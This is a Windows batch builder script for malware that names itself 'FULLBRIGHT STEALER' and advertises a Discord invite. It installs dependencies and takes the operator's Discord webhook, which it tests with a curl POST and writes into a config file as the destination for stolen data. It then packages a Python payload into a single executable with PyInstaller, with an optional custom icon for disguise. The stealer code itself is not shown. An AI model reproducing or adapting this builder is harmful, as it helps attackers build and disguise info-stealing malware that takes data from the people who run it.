@echo off
cls
color 04
echo WELCOME TO FULLBRIGHT STEALER BY RAYWZW-JOIN https://discord.gg/aGpfgnW4aW
timeout /t 2 /nobreak >nul
cls
echo Installing dependencies from requirements.txt...
pip install -r requirements.txt
echo Please enter your Discord webhook URL:
set /p WEBHOOK_URL=Webhook URL: 

:validateWebhook
echo Testing webhook...
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Webhook works\"}" %WEBHOOK_URL%
if %errorlevel% neq 0 (
    echo Invalid webhook URL, please try again.
    set /p WEBHOOK_URL=Webhook URL: 
    goto validateWebhook
)

echo Updating co/config.py with the provided webhook URL...
(
    echo WEBHOOK_URL = '%WEBHOOK_URL%'
) > co/config.py

echo Please enter the path to the .ico icon file (Press Enter for no icon):
set /p ICON_PATH=Icon Path: 
if "%ICON_PATH%"=="" (
    echo No icon provided, proceeding without icon...
    pyinstaller --onefile --exclude-module pyopencv --exclude-module _lzma --exclude-module _multiprocessing --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module flask --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module google --exclude-module zstandard --hidden-import pyautogui --name main main.pyw
) else (
    echo Using icon: %ICON_PATH%
    pyinstaller --onefile --exclude-module pyopencv --exclude-module _lzma --exclude-module _multiprocessing --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module flask --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module google --exclude-module zstandard --hidden-import pyautogui --name main --icon "%ICON_PATH%" main.pyw
)
echo exe built in dist folder
echo Cleaning up...
del main.spec
rd /s /q build
pause
 